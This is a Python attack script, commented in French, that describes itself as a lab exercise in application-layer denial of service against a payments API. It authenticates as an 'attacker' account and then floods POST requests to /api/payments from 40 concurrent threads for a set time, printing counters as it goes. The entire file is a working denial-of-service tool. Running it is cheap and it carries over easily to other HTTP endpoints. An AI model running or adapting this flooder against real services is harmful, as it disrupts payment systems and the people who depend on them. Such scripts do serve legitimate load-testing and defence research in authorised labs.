#!/usr/bin/env python3
"""Attaque principale: deni de service applicatif controle sur /api/payments.
Volontairement non distribue (une seule IP) pour rester reproductible et legal en laboratoire."""
import argparse, time, threading, itertools, sys
import httpx

ap = argparse.ArgumentParser()
ap.add_argument("--target", default="http://10.136.206.89:8080")
ap.add_argument("--user", default="attacker"); ap.add_argument("--password", required=True)
ap.add_argument("--threads", type=int, default=40); ap.add_argument("--seconds", type=int, default=90)
a = ap.parse_args()
stop = time.time() + a.seconds
tok = httpx.post(a.target + "/auth/login", json={"username": a.user, "password": a.password}, timeout=5).json().get("token")
if not tok:
    print("login attaquant impossible (verifier --password / DEMO_PASSWORD)"); sys.exit(1)
h = {"Authorization": "Bearer " + tok}
sent = ok = err = [0], [0], [0]
counters = {"sent": 0, "ok": 0, "err": 0}
lock = threading.Lock()


def hammer():
    with httpx.Client(timeout=2) as c:
        while time.time() < stop:
            try:
                r = c.post(a.target + "/api/payments", json={"to": "merchant", "amount": "1.00"}, headers=h)
                with lock:
                    counters["sent"] += 1; counters["ok" if r.status_code == 201 else "err"] += 1
            except Exception:
                with lock: counters["sent"] += 1; counters["err"] += 1


threads = [threading.Thread(target=hammer) for _ in range(a.threads)]
print(f"ATTAQUE: {a.threads} threads pendant {a.seconds}s sur {a.target}")
[t.start() for t in threads]
while time.time() < stop:
    time.sleep(2); print(counters)
[t.join() for t in threads]
print("FIN", counters)
